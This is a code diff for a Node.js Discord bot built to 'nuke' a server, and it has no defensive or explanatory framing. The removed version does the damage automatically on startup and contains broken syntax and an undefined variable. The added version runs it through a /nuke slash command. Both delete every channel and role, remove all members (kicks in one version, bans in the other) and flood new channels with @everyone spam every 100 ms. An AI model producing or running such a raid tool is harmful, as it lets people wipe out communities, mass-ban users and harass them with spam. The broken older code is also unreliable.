@@ -1,64 +1,88 @@
-const { Client, GatewayIntentBits } = require('discord.js');
+const { Client, GatewayIntentBits, REST, Routes } = require('discord.js');
+
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
-    GatewayIntentBits.GuildMembers,
-    GatewayIntentBits.MessageContent
+    GatewayIntentBits.MessageContent,
+    GatewayIntentBits.GuildMembers
   ]
 });
 
-client.once('ready', () => {
-  console.log('Am getting ready...');
-  
-  const guild = client.guilds.cache.first();
-  
-  // Delete all channels
-  guild.channels.cache.forEach(channel => {
-    channel.delete().create {
-      console.log(`Deleted channel: ${channel.name}`);
-    }
-  });
-  
-  // Create spam channels and ping everyone
-  let channelCount = 0;
-  const spamInterval = setInterval(() => {
-    guild.channels.create({
-      name: 'GET-FUCKED-LOL',
-      type: 'GUILD_TEXT'
-    }).then(channel => {
-      channelCount++;
-      if (channelCount > 100) clearInterval(spamInterval);
-      
-      guild.members.fetch().then(members => {
-        const pingList = members.map(member => `<@${member.id}>`).join(' ');
-        channel.send(pingMobilePing);
-      });
-    });
-  }, 100);
-  
-  // Delete all roles (except @everyone)
-  guild.roles.cache.forEach(role => {
-    if (role.name !== '@everyone') {
-      role.delete();
-    }
-  });
-  
-  // Delete all emojis
-  guild.emojis.cache.forEach(emoji => {
-    emoji.delete();
-  });
-  
-  // Kick all members (except bot owners)
-  guild.members.fetch().then(members => {
-    members.forEach(member => {
-      if (!member.user.bot) {
-        member.kick();
-      }
-    });
-  });
+// Register slash commands
+const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
+
+const commands = [
+  {
+    name: 'nuke',
+    description: 'Execute server nuke (ADMIN ONLY)'
+  }
+];
+
+(async () => {
+  try {
+    console.log('Started refreshing application (/) commands.');
+
+    await rest.put(
+      Routes.applicationCommands(process.env.CLIENT_ID),
+      { body: commands },
+    );
+
+    console.log('Successfully reloaded application (/) commands.');
+  } catch (error) {
+    console.error(error);
+  }
+})();
+
+client.on('ready', () => {
+  console.log(`Logged in as ${client.user.tag}!`);
 });
 
-client.login(process.env.BOT_TOKEN);
+client.on('interactionCreate', async interaction => {
+  if (!interaction.isChatInputCommand()) return;
 
-module.exports = client;
+  if (interaction.commandName === 'nuke') {
+    // Check if user is admin
+    if (!interaction.member.permissions.has('Administrator')) {
+      return interaction.reply({ content: 'You need admin permissions to use this command!', ephemeral: true });
+    }
+
+    await interaction.reply({ content: 'Nuke initiated...', ephemeral: true });
+
+    const guild = interaction.guild;
+    
+    // Delete all channels
+    guild.channels.cache.forEach(channel => {
+      if (channel.deletable) {
+        channel.delete().catch(err => console.error(err));
+      }
+    });
+
+    // Delete all roles
+    guild.roles.cache.forEach(role => {
+      if (role.editable && !role.managed && role.id !== guild.id) {
+        role.delete().catch(err => console.error(err));
+      }
+    });
+
+    // Ban all members
+    guild.members.cache.forEach(member => {
+      if (!member.user.bot && member.id !== interaction.user.id) {
+        member.ban({ reason: 'Server nuked' }).catch(err => console.error(err));
+      }
+    });
+
+    // Create 100 channels and spam
+    for (let i = 0; i < 100; i++) {
+      guild.channels.create({ name: 'GET-FUCKED' })
+        .then(channel => {
+          setInterval(() => {
+            channel.send('@everyone GET NUCKED LOL');
+          }, 100);
+        })
+        .catch(err => console.error(err));
+    }
+  }
+});
+
+client.login(process.env.TOKEN);
